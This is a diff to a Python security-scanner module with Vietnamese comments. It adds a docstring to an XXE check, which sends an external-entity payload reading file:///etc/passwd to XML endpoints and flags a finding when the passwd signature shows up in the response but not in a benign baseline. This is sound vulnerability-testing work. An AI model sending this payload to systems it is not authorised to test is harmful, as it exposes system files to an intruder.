@@ -13,7 +13,7 @@ import re
 from app.schemas import Finding
 
 PASSWD_SIG = re.compile(r"root:.*:0:0:")
-# Payload tiem: khai bao thuc the ngoai doc /etc/passwd.
+# Payload tiêm: khai báo thực thể ngoài đọc /etc/passwd.
 XXE_PAYLOAD = ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                '"file:///etc/passwd">]><foo>&xxe;</foo>')
 BENIGN_XML = '<?xml version="1.0"?><foo>sentinel-benign</foo>'
@@ -37,6 +37,7 @@ def _xml_endpoints(pages: list[dict]) -> list[str]:
 
 # [TN11 - XXE] Endpoint nhận XML: gửi payload thực thể ngoài trỏ /etc/passwd, oracle kiểm chữ ký.
 def check_xxe(tools, pages: list[dict]) -> list[Finding]:
+    """Thử XXE trên endpoint nhận XML; công nhận khi phản hồi tiêm lộ /etc/passwd còn baseline thì không."""
     findings: list[Finding] = []
     for url in _xml_endpoints(pages):
         baseline = tools.request(url, "POST", data=BENIGN_XML, headers={"Content-Type": "application/xml"})
